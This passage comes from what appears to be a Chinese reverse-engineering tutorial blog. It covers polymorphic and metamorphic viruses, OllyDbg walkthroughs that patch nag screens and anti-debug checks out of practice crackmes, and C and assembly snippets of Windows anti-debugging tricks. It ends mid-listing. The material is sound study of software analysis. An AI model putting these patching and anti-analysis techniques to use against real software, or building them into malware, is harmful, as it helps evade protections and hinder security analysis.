多态\n\n多态是第一种对杀毒软件造成严重威胁的技术。一个多态病毒在触发时由解密模块进行解密，在感染时由加密模块进行加密并感染，但其加密模块在每一次的感染中会有所修改。因此，一个仔细设计的多态病毒在每一次感染中没有一部分是相同的。这使得使用病毒特征码进行侦测变得困难。杀毒软件必须在模拟器上对该病毒解密进而侦测该病毒，或是利用加密病毒其统计样板上的分析。\n\n### 28.2 变形\n\n变形病毒为了避免被杀毒软件通过模拟环境或“蜜罐”系统查杀，在每一次感染都完全将其自身改写。有些变形病毒可以感染多个操作系统，如Simile病毒可以感染Windows的PE文件和Linux的ELF文件。变形病毒要达到可变形，一个变形引擎是必需的。一个变形病毒通常非常庞大且复杂，如Simile病毒包含了14000行汇编语言，其中90%都是变形引擎。\n\n### 28.3 XOR指令\n\n加密最基础的指令\n\n```\n如果A xor B = C\n则  C xor B = A\n```\n\n## 29. 实验十七 ReverseMe Tutorial\n\n{% asset_img 实验17.png 实验17 %}\n\n{% asset_img 实验17.1.png 实验17.1 %}\n\n目标：\n\n{% asset_img 实验17.2.png 实验17.2 %}\n\nWin32汇编编写的程序，32位可执行文件。(用汇编写代码nb)\n\n载入OD，在反汇编窗口就可看到NAG窗口的字符串，看不到的话就搜索字符串定位。\n\n```asm\n00401288 > $  6A 00         push 0x0\n0040128A      E8            db E8\n0040128B      EF            db EF\n0040128C      FF            db FF\n0040128D      FF            db FF\n0040128E      FF            db FF\n0040128F      A3            db A3\n00401290      30314000      dd ReverseM.00403130\n00401294   .  BF 11104000   mov edi,ReverseM.00401011\n00401299   .  E8 71000000   call ReverseM.0040130F\n0040129E   >  E8 6EFDFFFF   call ReverseM.00401011\n004012A3   .  33C0          xor eax,eax\n004012A5   .  50            push eax\n004012A6   .  57            push edi                                 ;  ReverseM.<ModuleEntryPoint>\n004012A7   .^ 7C F5         jl short ReverseM.0040129E\n004012A9   .^ 0F84 51FDFFFF je ReverseM.00401000\n004012AF   .  6A 00         push 0x0                                 ; /Style = MB_OK|MB_APPLMODAL\n004012B1   .  68 7D314000   push ReverseM.0040317D                   ; |Title = \"TutorialNag\"\n004012B6   .  68 34314000   push ReverseM.00403134                   ; |Text = \"You need to remove the nag\nTry to do it in a two byte patch. \nRegards!\"\n004012BB   .  6A 00         push 0x0                                 ; |hOwner = NULL\n004012BD   .  E8 92FFFFFF   call <jmp.&USER32.MessageBoxA>           ; \\MessageBoxA\n```\n\n在004012AF处下断点，运行试试，发现还没跑到断点处就弹出NAG，说明这个`MessageBoxA`是作者误导人的。观察一下函数的入口处，我们之前的程序大多是55作为函数的开头，这个是6A00开头。而且接下来的不像是指令，更像是数据段存放的数据，F8步过还会跳转(128A跳转到128F)，这是因为OD自动帮我们分析这个程序，右键->分析->从模块中删除分析，就可看到汇编指令。\n\n```asm\n00401288 >  6A 00           push 0x0\n0040128A    E8 EFFFFFFF     call <jmp.&KERNEL32.GetModuleHandleA>\n0040128F    A3 30314000     mov dword ptr ds:[0x403130],eax          ; ReverseM.00400000\n00401294    BF 11104000     mov edi,ReverseM.00401011\n00401299    E8 71000000     call ReverseM.0040130F\n0040129E    E8 6EFDFFFF     call ReverseM.00401011\n004012A3    33C0            xor eax,eax                              ; ReverseM.00400000\n004012A5    50              push eax                                 ; ReverseM.00400000\n004012A6    57              push edi                                 ; ReverseM.<ModuleEntryPoint>\n004012A7  ^ 7C F5           jl short ReverseM.0040129E\n004012A9  ^ 0F84 51FDFFFF   je ReverseM.00401000\n004012AF    6A 00           push 0x0\n004012B1    68 7D314000     push ReverseM.0040317D                   ; ASCII \"TutorialNag\"\n004012B6    68 34314000     push ReverseM.00403134                   ; ASCII \"You need to remove the nag\\r\\nTry to do it in a two byte patch. \\r\\nRegards!\"\n004012BB    6A 00           push 0x0\n004012BD    E8 92FFFFFF     call <jmp.&USER32.MessageBoxA>\n```\n\n从头开始F8步过，发现在0040129E地址处就弹出NAG。下断点进入函数。\n\n```asm\n00401011   $  33C0          xor eax,eax                              ;  ReverseM.00401218\t;edi=401011\n00401013   .  66:C707 6A00  mov word ptr ds:[edi],0x6A\n;将0x6A赋值给edi,这个401011地址处的机器码改为6A00\n00401018   .  83C7 02       add edi,0x2\n0040101B   .  C707 687D3040 mov dword ptr ds:[edi],0x40307D68\n00401021   .  83C7 04       add edi,0x4\n00401024   .  C607 00       mov byte ptr ds:[edi],0x0\n00401027   .  47            inc edi                                  ;  ReverseM.00401011\n00401028   .  C707 68343040 mov dword ptr ds:[edi],0x40303468\n0040102E   .  83C7 04       add edi,0x4\n00401031   .  C607 00       mov byte ptr ds:[edi],0x0\n00401034   .  47            inc edi                                  ;  ReverseM.00401011\n00401035   .  66:C707 6A00  mov word ptr ds:[edi],0x6A\n0040103A   .  83C7 02       add edi,0x2\n0040103D   .  C707 E8300200 mov dword ptr ds:[edi],0x230E8\n00401043   .  83C7 04       add edi,0x4\n00401046   .  C607 00       mov byte ptr ds:[edi],0x0\n00401049   .  47            inc edi                                  ;  ReverseM.00401011\n0040104A   .  66:C707 EB44  mov word ptr ds:[edi],0x44EB\n0040104F   .  83EF 24       sub edi,0x24\n00401052   .  FFD7          call edi                                 ;  ReverseM.00401011\n00401054   .  E8 C7020000   call ReverseM.00401320\n00401059   .  E8 64020000   call ReverseM.004012C2\n0040105E   .  EB 15         jmp short ReverseM.00401075\n```\n\n往后走下的每一步，都会修改上一步的代码，光标到40104F地址代码变化如下(因为如果过了0040104F就会弹出NAG了，40104F变成了40104B和401051)：\n\n```asm\n00401011   .  6A 00         push 0x0\n00401013   ?  68 7D304000   push ReverseM.0040307D\n00401018   ?  68 34304000   push ReverseM.00403034\n0040101D   .  6A 00         push 0x0\n0040101F   .  E8 30020000   call <jmp.&USER32.MessageBoxA>\n00401024   ?  EB 44         jmp short ReverseM.0040106A\n00401026   ?  0047 C7       add byte ptr ds:[edi-0x39],al\n00401029   ?  07            pop es\n0040102A   ?  68 34304083   push 0x83403034\n0040102F   ?  C704C6 070047>mov dword ptr ds:[esi+eax*8],0x66470007\n00401036   ?  C707 6A0083C7 mov dword ptr ds:[edi],0xC783006A\n0040103C   ?  02C7          add al,bh\n0040103E   ?  07            pop es\n0040103F   ?  E8 30020083   call 83401274\n00401044   ?  C704C6 070047>mov dword ptr ds:[esi+eax*8],0x66470007\n0040104B   ?  C707 EB4483EF mov dword ptr ds:[edi],0xEF8344EB\n00401051   ?  24 FF         and al,0xFF\n00401053   ?  D7            xlat byte ptr ds:[ebx+al]\n00401054   ?  E8 C7020000   call ReverseM.00401320\n00401059   .  E8 64020000   call ReverseM.004012C2\n0040105E   .  EB 15         jmp short ReverseM.00401075\n```\n\n右键->分析->分析代码(快捷键Ctrl+A)，发现401011处竟然出现了`MessageBoxA`，40104F又回来了。\n\n```asm\n00401011   $  6A 00         push 0x0                                 ; /Style = MB_OK|MB_APPLMODAL\n00401013   .  68 7D304000   push ReverseM.0040307D                   ; |Title = \"缙擒邻疫猿竟嶂捃胖撉壑撦以撜淋迵芹謸嶂胖晾筑譂摼国菗幸輷阎撟茌謸谳撘撉能撗是掷撁仪雄潛竟衿菗峙至蕮芮壑翐儡咂勤茌撢罁遮葜澗咕圭圳罁嶂胖晾筑謸诶撁伊菗苷撘撉魄芰谝邼擌葙苁?\n00401018   .  68 34304000   push ReverseM.00403034                   ; |Text = \"贶茡葜肿撉軗林捃胖撉壑撦以竟缌蕮擒撟軗谇撢輷覔悄軗咽侵撁仪雄潛竟嶂砸磷罀崇魄芰谝啐以尘贯洲芘謸芹謸菀該樟苻撉壑撫峙至乐潛竟撔逸撗謸总葜撢輷覔悄軗咽侵罁靡切蹪摼柜魄撝胖潦撥芹至摾苓魄谲輷诶撜谳譂竟竟幺诶撫峙至乐撢罁靡燎撥論覔瞧擒邻?...\n0040101D   .  6A 00         push 0x0                                 ; |hOwner = NULL\n0040101F   .  E8 30020000   call <jmp.&USER32.MessageBoxA>           ; \\MessageBoxA\n00401024   .  EB 44         jmp short ReverseM.0040106A\n00401026      00            db 00\n00401027   .  47            inc edi                                  ;  ReverseM.00401024\n00401028   .  C707 68343040 mov dword ptr ds:[edi],0x40303468\n0040102E   .  83C7 04       add edi,0x4\n00401031   .  C607 00       mov byte ptr ds:[edi],0x0\n00401034   .  47            inc edi                                  ;  ReverseM.00401024\n00401035   .  66:C707 6A00  mov word ptr ds:[edi],0x6A\n0040103A   .  83C7 02       add edi,0x2\n0040103D   .  C707 E8300200 mov dword ptr ds:[edi],0x230E8\n00401043   .  83C7 04       add edi,0x4\n00401046   .  C607 00       mov byte ptr ds:[edi],0x0\n00401049   .  47            inc edi                                  ;  ReverseM.00401024\n0040104A   .  66:C707 EB44  mov word ptr ds:[edi],0x44EB\n0040104F   .  83EF 24       sub edi,0x24\n00401052   .  FFD7          call edi                                 ;  ReverseM.00401024\tedi=401000\n00401054   .  E8 C7020000   call ReverseM.00401320\n00401059   .  E8 64020000   call ReverseM.004012C2\n0040105E   .  EB 15         jmp short ReverseM.00401075\n```\n\n步入`call edi`指令，去到401000处。F8走走发现第3行到第8行在执行一个循环。\n\n```asm\n00401000   > /B8 00304000   mov eax,ReverseM.00403000\n;eax=403000,存的是代码段的地址\n00401005   > |8030 B3       xor byte ptr ds:[eax],0xB3\n;代码段的地址与0xb3异或，即这条指令在修改自身的代码，可以在数据窗口定位到403000观察数据变化\n00401008   . |40            inc eax\n00401009   . |3D 28314000   cmp eax,ReverseM.00403128\n;403000到403128这段代码分别与0xb3按字节进行异或(解密过程)\n0040100E   .^|7C F5         jl short ReverseM.00401005\n00401010   . |40            inc eax\n00401011   $ |6A 00         push 0x0                                 ; /Style = MB_OK|MB_APPLMODAL\n00401013   . |68 7D304000   push ReverseM.0040307D                   ; |Title = \"缙擒邻疫猿竟嶂捃胖撉壑撦以撜淋迵芹謸嶂胖晾筑譂摼国菗幸輷阎撟茌謸谳撘撉能撗是掷撁仪雄潛竟衿菗峙至蕮芮壑翐儡咂勤茌撢罁遮葜澗咕圭圳罁嶂胖晾筑謸诶撁伊菗苷撘撉魄芰谝邼擌葙苁?\n00401018   . |68 34304000   push ReverseM.00403034                   ; |Text = \"贶茡葜肿撉軗林捃胖撉壑撦以竟缌蕮擒撟軗谇撢輷覔悄軗咽侵撁仪雄潛竟嶂砸磷罀崇魄芰谝啐以尘贯洲芘謸芹謸菀該樟苻撉壑撫峙至乐潛竟撔逸撗謸总葜撢輷覔悄軗咽侵罁靡切蹪摼柜魄撝胖潦撥芹至摾苓魄谲輷诶撜谳譂竟竟幺诶撫峙至乐撢罁靡燎撥論覔瞧擒邻?...\n0040101D   . |6A 00         push 0x0                                 ; |hOwner = NULL\n0040101F   . |E8 30020000   call <jmp.&USER32.MessageBoxA>           ; \\MessageBoxA\n```\n\n而乱码的Title和Text的地址就在403000到403128之中，等循环走完，乱码的Title和Text解密解出来有意义的字符串。\n\n```asm\n00401011   $  6A 00         push 0x0                                 ; /Style = MB_OK|MB_APPLMODAL\n00401013   .  68 7D304000   push ReverseM.0040307D                   ; |Title = \"TutorialNag\"\n00401018   .  68 34304000   push ReverseM.00403034                   ; |Text = \"You need to remove the nag\nTry to do it in a two byte patch. \nRegards!\"\n0040101D   .  6A 00         push 0x0                                 ; |hOwner = NULL\n0040101F   .  E8 30020000   call <jmp.&USER32.MessageBoxA>           ; \\MessageBoxA\n```\n\n可见作者是不想我们通过字符串搜索查找出破解的线索，通过异或的方式进行加密。我们不能用nop方式消除NAG，因为这是解密之后的代码，如果全都nop掉，解密前的代码会受到影响，程序不能正常执行。并且由于它改的范围有点大，逆向回去不太好逆。我们之前还学过一种方法去除NAG：将它的父句柄修改，让它找不到父句柄，即`push 0x1`。\n\n直接修改肯定不行，那从头开始走一遍，不放过经过的每个call指令(API函数的call不跟进)，了解它的加解密过程。\n\n1. 00401299地址的call指令：解密401000到401218，xor 0x5A\n\n```asm\n0040130F  /$  B8 00104000   mov eax,ReverseM.00401000\n00401314  |>  8030 5A       xor byte ptr ds:[eax],0x5A\n00401317  |.  40            inc eax                                  ;  ReverseM.00401001\n00401318  |.  3D 18124000   cmp eax,<jmp.&USER32.BeginPaint>         ;  入口地址\t401218\n0040131D  |.^ 7C F5         jl short ReverseM.00401314\n0040131F  \\.  C3            retn\n```\n\n2. 0040129E地址的call指令：修改自身代码，401011到401025\n\n```asm\n0040104A   .  66:C707 EB44  mov word ptr ds:[edi],0x44EB\n;在401024位置写入两个数据，也就是修改到401025位置\n```\n\n3. 00401052地址的call指令：对NAG窗口加密的标题和文本进行解密，403000到403128，xor 0xB3\n\n4. 修改自身代码，401011到401027\n\n```asm\n0040106A   > \\83C7 11       add edi,0x11\n;edi=401011\n0040106D   .  66:C707 6A0A  mov word ptr ds:[edi],0xA6A\n00401072   .  83C7 02       add edi,0x2\n00401075   >  C707 FF353431 mov dword ptr ds:[edi],0x313435FF\n0040107B   .  83C7 04       add edi,0x4\n0040107E   .  66:C707 4000  mov word ptr ds:[edi],0x40\n00401083   .  83C7 02       add edi,0x2\n00401086   .  66:C707 6A00  mov word ptr ds:[edi],0x6A\n0040108B   .  83C7 02       add edi,0x2\n0040108E   .  C707 FF353031 mov dword ptr ds:[edi],0x313035FF\n00401094   .  83C7 04       add edi,0x4\n00401097   .  66:C707 4000  mov word ptr ds:[edi],0x40\n0040109C   .  83C7 02       add edi,0x2\n0040109F   .  C707 E8900000 mov dword ptr ds:[edi],0x90E8\n004010A5   .  83C7 04       add edi,0x4\n004010A8   .  C607 00       mov byte ptr ds:[edi],0x0\n004010AB   .  47            inc edi                                  ;  ReverseM.00401000\n004010AC   .  66:C707 EB2C  mov word ptr ds:[edi],0x2CEB\n;edi=401026,写入两个字节，也就是到401027\n004010B1   .  83EF 15       sub edi,0x15\n004010B4   .  FFD7          call edi                                 ;  ReverseM.00401000\n```\n\n5. 004010B4地址的call指令->00401021地址的call指令：显示主程序\n\n6. 00401054地址的call指令：重新对NAG窗口加密，403000到403128，xor 0x8D\n\n```asm\n00401320  /$  B8 00304000   mov eax,ReverseM.00403000                ;  ASCII \"ReverseMeTutorial\"\n00401325  |>  8030 8D       /xor byte ptr ds:[eax],0x8D\n00401328  |.  40            |inc eax\n00401329  |.  3D 28314000   |cmp eax,ReverseM.00403128\n0040132E  |.^ 7C F5         \\jl short ReverseM.00401325\n00401330  \\.  C3            retn\n```\n\n7. 00401059地址的call指令：退出程序\n\n现在如果想要修改为`push 0x1`，则0040101D地址处的机器码要为6A01。\n\n```asm\n0040101D      6A 01         push 0x1\n```\n\n走进0040129E地址的函数，盯着寄存器窗口的edi值变为1D时，光标走到下面这个位置。\n\n```asm\n00401035   .  66:C707 6A00    mov word ptr ds:[edi],0x6A\n要让它变为\n00401035   .  66:C707 6A01    mov word ptr ds:[edi],0x016A\n```\n\n不能直接修改，因为前面还有个解密过程xor 0x5A。1^5A=5B\n\n66:C707 6A00中的00是00401039，在数据窗口Ctrl+G查找地址，修改为5B即可。\n\n还有一种方法绕过MessageBoxA。这个函数的下面有个无条件跳转指令，不如让它提前执行，绕过MessageBoxA。\n\n```asm\n00401011   $  6A 00           push 0x0                                 ; /Style = MB_OK|MB_APPLMODAL\n00401013   .  68 7D304000     push ReverseM.0040307D                   ; |Title = \"TutorialNag\"\n00401018   .  68 34304000     push ReverseM.00403034                   ; |Text = \"You need to remove the nag\nTry to do it in a two byte patch. \nRegards!\"\n0040101D      6A 00           push 0x0\n0040101F   .  E8 30020000     call <jmp.&USER32.MessageBoxA>           ; \\MessageBoxA\n00401024   .  EB 44           jmp short ReverseM.0040106A\n```\n\n```asm\n00401011   $  6A 00           push 0x0\n变为\n00401011     /EB 57           jmp short ReverseM.0040106A \n```\n\n所以就是让401011地址的机器码变为EB57。继续盯着edi变为1011时\n\n```asm\n00401013   .  66:C707 6A00    mov word ptr ds:[edi],0x6A               ; |Title\n要让它变为\n00401013      66:C707 EB57    mov word ptr ds:[edi],0x57EB\n```\n\nEB\\^5A=B1，57\\^5A=0D。在数据窗口的401016地址处修改为B10D。(检查401016地址处是否为6A00，是的话再改，不是的话程序先执行到401016地址是6A00为止)\n\n## 30. 反调试\n\n好的软件及病毒、木马等都具备反调试功能，要研究它们，必须先掌握它们的反调试技术，才能提升出反反调试的方案。(禁止套娃！)\n\n### 30.1 Windows API 方法\n\nWin32 提供了两个 API ，`IsDebuggerPresent ` 和 `CheckRemoteDebuggerPresent `可以用来检测当前进程是否正在被调试，以`IsDebuggerPresent` 函数为例，例子如下：\n\n```cpp\n#include<stdio.h>\n#include<Windows.h>\n\nint main()\n{\n    BOOL ret = IsDebuggerPresent();\n    printf(\"ret = %d\\n\", ret);\n}\n//在VS中F5\tret = 1\n//Ctrl+F5\t ret = 0\n```\n\n破解方法很简单，就是在系统里将这两个函数 hook 掉，让这两个函数一直返回 false 就可以了，网上有很多做 hook API 工作的工具，也有很多工具源代码是开放的，所以这里就不细谈了。\n\n### 30.2 查询进程 PEB 的 BeingDebugged 标志位\n\n当进程被调试器所附加的时候，操作系统会自动设置这个标志位，因此在程序里定期查询这个标志位就可以了，例子如下： \n\n```c\nbool PebIsDebuggedApproach()\n{\n       char result = 0;\n       __asm\n       {\n            // 进程的PEB地址放在fs这个寄存器位置上\n            mov eax, fs:[30h]\n            // 查询BeingDebugged标志位\n            mov al, BYTE PTR [eax + 2] \n            mov result, al\n       }\n       return result != 0;\n}\n```\n\n### 30.3 查询进程 PEB 的 NtGlobal 标志位 \n\n跟第二个方法一样，当进程被调试的时候，操作系统除了修改 BeingDebugged 这个标志位以外，还会修改其他几个地方，其中NtDll 中一些控制堆（Heap）操作的函数的标志位就会被修改，因此也可以查询这个标志位，例子如下： \n\n```c\nbool PebNtGlobalFlagsApproach()\n{\n       int result = 0;\n       __asm\n       {\n           // 进程的PEB\n           mov eax, fs:[30h]\n           // 控制堆操作函数的工作方式的标志位\n           mov eax, [eax + 68h]\n           // 操作系统会加上这些标志位FLG_HEAP_ENABLE_TAIL_CHECK, \n           // FLG_HEAP_ENABLE_FREE_CHECK and FLG_HEAP_VALIDATE_PARAMETERS，\n           // 它们的并集就是x70\n           //\n           // 下面的代码相当于C/C++的\n           // eax = eax & 0x70\n           and eax, 0x70\n           mov result, eax\n       }\n       return result != 0;\n \n}\n```\n\n### 30.4 查询进程堆的一些标志位\n\n这个方法是第三个方法的变种，只要进程被调试，进程在堆上分配的内存，在分配的堆的头信息里，ForceFlags 这个标志位会被修改，因此可以通过判断这个标志位的方式来反调试。因为进程可以有很多的堆，因此只要检查任意一个堆的头信息就可以了，所以这个方法貌似很强大，例子如下： \n\n```c\nbool HeapFlagsApproach()\n{\n       int result = 0;\n       __asm\n       {\n           // 进程的PEB\n           mov eax, fs:[30h]\n           // 进程的堆，我们随便访问了一个堆，下面是默认的堆\n           mov eax, [eax + 18h]\n           // 检查ForceFlag标志位，在没有被调试的情况下应该是\n           mov eax, [eax + 10h]\n           mov result, eax\n       }\n       return result != 0;\n}\n```\n\n### 30.5 使用 NtQueryInformationProcess 函数\n\n`NtQueryInformationProcess`函数是一个未公开的 API，它的第二个参数可以用来查询进程的调试端口。如果进程被调试，那么返回的端口值会是 -1，否则就是其他的值。由于这个函数是一个未公开的函数，因此需要使用 LoadLibrary 和 GetProceAddress的方法获取调用地址，示例代码如下： \n\n```c\n// 声明一个函数指针。\n \ntypedef NTSTATUS (WINAPI *NtQueryInformationProcessPtr)(\n       HANDLE processHandle,\n       PROCESSINFOCLASS processInformationClass,\n       PVOID processInformation,\n       ULONG processInformationLength,\n       PULONG returnLength);\n \n \nbool NtQueryInformationProcessApproach()\n{\n       int debugPort = 0;\n       HMODULE hModule = LoadLibrary(TEXT(\"Ntdll.dll \"));\n       NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hModule, \"NtQueryInformationProcess\");\n \n       if ( NtQueryInformationProcess(GetCurrentProcess(), (PROCESSINFOCLASS)7, &debugPort, sizeof(debugPort), NULL) )\n              printf(\"[ERROR NtQueryInformationProcessApproach] NtQueryInformationProcess failed\\n\");\n \n       else\n              return debugPort == -1;\n       return false;\n \n}\n```\n\n### 30.6 NtSetInformationThread 方法\n\n这个也是使用 Windows 的一个未公开函数的方法，你可以在当前线程里调用 NtSetInformationThread，调用这个函数时，如果在第二个参数里指定 0x11 这个值（意思是 ThreadHideFromDebugger ），等于告诉操作系统，将所有附加的调试器统统取消掉。示例代码：\n\n```c\n// 声明一个函数指针。\n \ntypedef NTSTATUS (*NtSetInformationThreadPtr)(HANDLE threadHandle,\n       THREADINFOCLASS threadInformationClass,\n       PVOID threadInformation,\n       ULONG threadInformationLength);\n \nvoid NtSetInformationThreadApproach()\n{\n      HMODULE hModule = LoadLibrary(TEXT(\"ntdll.dll\"));\n      NtSetInformationThreadPtr NtSetInformationThread = (NtSetInformationThreadPtr)GetProcAddress(hModule, \"NtSetInformationThread\");\n      NtSetInformationThread(GetCurrentThread(), (THREADINFOCLASS)0x11, 0, 0);\n \n}\n```\n\n### 30.7 触发异常的方法\n\n这个技术的原理是，首先，进程使用 SetUnhandledExceptionFilter 函数注册一个未处理异常处理函数A，如果进程没有被调试的话，那么触发一个未处理异常，会导致操作系统将控制权交给先前注册的函数A；而如果进程被调试的话，那么这个未处理异常会被调试器捕捉，这样我们的 函数A 就没有机会运行了。\n\n这里有一个技巧，就是触发未处理异常的时候，如果跳转回原来代码继续执行，而不是让操作系统关闭进程。方案是在函数A里修改eip的值，因为在函数A的参数`_EXCEPTION_POINTERS`里，会保存当时触发异常的指令地址，所以在 函数A 里根据这个指令地址修改寄存器eip的值就可以了，示例代码如下：\n\n```cpp\n \n \n// 进程要注册的未处理异常处理程序A\nLONG WINAPI MyUnhandledExceptionFilter(struct _EXCEPTION_POINTERS *pei)\n{\n       SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)\n              pei->ContextRecord->Eax);\n       // 修改寄存器eip的值\n       pei->ContextRecord->Eip += 2;\n       // 告诉操作系统，继续执行进程剩余的指令（指令保存在eip里），而不是关闭进程\n       return EXCEPTION_CONTINUE_EXECUTION;\n}\n \n \nbool UnhandledExceptionFilterApproach()\n{\n \n       SetUnhandledExceptionFilter(MyUnhandledExceptionFilter);\n       __asm\n \n       {\n              // 将eax清零\n              xor eax, eax\n              // 触发一个除零异常\n              div eax\n       }\n       return false;\n \n}\n```\n\n### 30.8 调用 DeleteFiber 函数\n\n如果给 DeleteFiber 函数传递一个无效的参数的话，DeleteFiber函数除了会抛出一个异常以外，还是将进程的LastError值设置为具体出错原因的代号。然而，如果进程正在被调试的话，这个LastError值会被修改，因此如果调试器绕过了第七步里讲的反调试技术的话，我们还可以通过验证LastError值是不是被修改过来检测调试器的存在，示例代码： \n\n```c\nbool DeleteFiberApproach()\n{\n       char fib[1024] = {0};\n       // 会抛出一个异常并被调试器捕获\n       DeleteFiber(fib);\n       // 0x57的意思是ERROR_INVALID_PARAMETER\n       return (GetLastError() != 0x57);\n}\n```\n\n## 31. 实验十八 ReverseMe反调试\n\n{% asset_img 实验18.png 实验18 %}\n\n这四个都可以利用Keyfile.dat正确打开，但它们利用了不同的反调试技术。\n\n### 31.1 ReverseMe.A\n\n这个要用原版OD，吾爱太强大了，直接给通过。\n\n{% asset_img 实验18.1.png 实验18.1 %}\n\nF8一路走，弹窗下断点，跟进去。\n\n```asm\n004010D3   > E8 23000000                 CALL ReverseM.004010FB;弹窗，跟进去\n004010D8   . 83FE 08                     CMP ESI,8\n004010DB   . 7C 05                       JL SHORT ReverseM.004010E2\n004010DD   . E8 2C000000                 CALL ReverseM.0040110E\n004010E2   > 6A 00                       PUSH 0                                                        ; |/Style = MB_OK|MB_APPLMODAL\n004010E4   . 68 00204000                 PUSH ReverseM.00402000                                        ; ||Title = \" Key File ReverseMe\"\n004010E9   . 68 86204000                 PUSH ReverseM.00402086                                        ; ||Text = \"Keyfile is not valid. Sorry.\"\n004010EE   . 6A 00                       PUSH 0                                                        ; ||hOwner = NULL\n004010F0   . E8 72020000                 CALL <JMP.&user32.MessageBoxA>                                ; |\\MessageBoxA\n004010F5   . E8 BF010000                 CALL <JMP.&kernel32.ExitProcess>                              ; \\ExitProcess\n004010FA   . C3                          RETN\n004010FB   $ E8 D7010000                 CALL <JMP.&kernel32.IsDebuggerPresent>                        ; [IsDebuggerPresent\n;调用IsDebuggerPresent函数\n00401100   . 83F8 01                     CMP EAX,1\n;返回值1表示在调试，0表示无调试\n00401103   .^74 DD                       JE SHORT ReverseM.004010E2\n00401105   . C3                          RETN\n00401106   . 6A 00                       PUSH 0                                                        ; /ExitCode = 0\n00401108   . E8 AC010000                 CALL <JMP.&kernel32.ExitProcess>                              ; \\ExitProcess\n0040110D   . C3                          RETN\n0040110E  /$ 6A 00                       PUSH 0                                                        ; |/Style = MB_OK|MB_APPLMODAL\n00401110  |. 68 00204000                 PUSH ReverseM.00402000                                        ; ||Title = \" Key File ReverseMe\"\n00401115  |. 68 51204000                 PUSH ReverseM.00402051                                        ; ||Text = \" You really did it! Congratz !!!\"\n0040111A  |. 6A 00                       PUSH 0                                                        ; ||hOwner = NULL\n0040111C  |. E8 46020000                 CALL <JMP.&user32.MessageBoxA>                                ; |\\MessageBoxA\n00401121  \\. E8 93010000                 CALL <JMP.&kernel32.ExitProcess>                              ; \\ExitProcess\n00401126   . C3                          RETN\n```\n\n```asm\n00401103   .^74 DD                       JE SHORT ReverseM.004010E2\n修改为\n00401103     90                          NOP\n00401104     90                          NOP\n```\n\n{% asset_img 实验18.2.png 实验18.2 %}\n\n在OD运行也成功了。\n\n### 31.2 ReverseMe.B\n\n点击运行，OD停在了401106处，执行不下去。\n\n{% asset_img 实验18.3.png 实验18.3 %}\n\n重载，一路F8步过，是从4010D3地址处的call指令去到10FB地址再去到1106卡住。\n\n```asm\n![实验18.4](F:\\markdown图片\\OD使用教程\\实验18.4.png)004010D3   > E8 23000000    CALL ReverseM.004010FB\n004010D8   . 83FE 08        CMP ESI,8\n004010DB   . 7C 05          JL SHORT ReverseM.004010E2\n004010DD   . E8 2C000000    CALL ReverseM.0040110E\n004010E2   > 6A 00          PUSH 0                                   ; |/Style = MB_OK|MB_APPLMODAL\n004010E4   . 68 00204000    PUSH ReverseM.00402000                   ; ||Title = \" Key File ReverseMe\"\n004010E9   . 68 86204000    PUSH ReverseM.00402086                   ; ||Text = \"Keyfile is not valid. Sorry.\"\n004010EE   . 6A 00          PUSH 0                                   ; ||hOwner = NULL\n004010F0   . E8 72020000    CALL <JMP.&user32.MessageBoxA>           ; |\\MessageBoxA\n004010F5   . E8 BF010000    CALL <JMP.&kernel32.ExitProcess>         ; \\ExitProcess\n004010FA   . C3             RETN\n004010FB  /$ E8 D7010000    CALL <JMP.&kernel32.IsDebuggerPresent>   ; [IsDebuggerPresent\n00401100  |. 83F8 01        CMP EAX,1\n00401103  |. 74 01          JE SHORT ReverseM.00401106\n00401105  |. C3             RETN\n00401106  |> 8925 21114000  MOV DWORD PTR DS:[401121],ESP\n;跳到一个错误位置\n0040110C  \\. C3             RETN\n```\n\n同样nop掉关键跳转指令不让它跳转\n\n```asm\n00401103  |. 74 01          JE SHORT ReverseM.00401106\n修改为\n00401103     90             NOP\n00401104     90             NOP\n```\n\n### 31.3 ReverseMe.C\n\n{% asset_img 实验18.4.png 实验18.4 %}\n\n这一次是直接退出程序了。\n\n```asm\n004010D3   > E8 23000000    CALL ReverseM.004010FB\n004010D8   . 83FE 08        CMP ESI,8\n004010DB   . 7C 05          JL SHORT ReverseM.004010E2\n004010DD   . E8 2C000000    CALL ReverseM.0040110E\n004010E2   > 6A 00          PUSH 0                                   ; |/Style = MB_OK|MB_APPLMODAL\n004010E4   . 68 00204000    PUSH ReverseM.00402000                   ; ||Title = \" Key File ReverseMe\"\n004010E9   . 68 86204000    PUSH ReverseM.00402086                   ; ||Text = \"Keyfile is not valid. Sorry.\"\n004010EE   . 6A 00          PUSH 0                                   ; ||hOwner = NULL\n004010F0   . E8 72020000    CALL <JMP.&user32.MessageBoxA>           ; |\\MessageBoxA\n004010F5   . E8 BF010000    CALL <JMP.&kernel32.ExitProcess>         ; \\ExitProcess\n004010FA   . C3             RETN\n004010FB  /$ E8 D7010000    CALL <JMP.&kernel32.IsDebuggerPresent>   ; [IsDebuggerPresent\n00401100  |. 83F8 01        CMP EAX,1\n00401103  |. 74 01          JE SHORT ReverseM.00401106\n00401105  |. C3             RETN\n00401106  |> 6A 00          PUSH 0                                   ; /ExitCode = 0\n00401108  \\. E8 AC010000    CALL <JMP.&kernel32.ExitProcess>         ; \\ExitProcess\n0040110D   . C3             RETN\n```\n\n又是改那个je跳转。\n\n### 31.4 ReverseMe.D\n\n{% asset_img 实验18.5.png 实验18.5 %}\n\n这次直接变空白了，OD要傻掉了。\n\n```asm\n004010D3   > E8 23000000    CALL ReverseM.004010FB\n004010D8   . 83FE 08        CMP ESI,8\n004010DB   . 7C 05          JL SHORT ReverseM.004010E2\n004010DD   . E8 2C000000    CALL ReverseM.0040110E\n004010E2   > 6A 00          PUSH 0                                   ; |/Style = MB_OK|MB_APPLMODAL\n004010E4   . 68 00204000    PUSH ReverseM.00402000                   ; ||Title = \" Key File ReverseMe\"\n004010E9   . 68 86204000    PUSH ReverseM.00402086                   ; ||Text = \"Keyfile is not valid. Sorry.\"\n004010EE   . 6A 00          PUSH 0                                   ; ||hOwner = NULL\n004010F0   . E8 72020000    CALL <JMP.&user32.MessageBoxA>           ; |\\MessageBoxA\n004010F5   . E8 BF010000    CALL <JMP.&kernel32.ExitProcess>         ; \\ExitProcess\n004010FA   . C3             RETN\n004010FB  /$ E8 D7010000    CALL <JMP.&kernel32.IsDebuggerPresent>   ; [IsDebuggerPresent\n00401100  |. 83F8 01        CMP EAX,1\n00401103  |. 74 01          JE SHORT 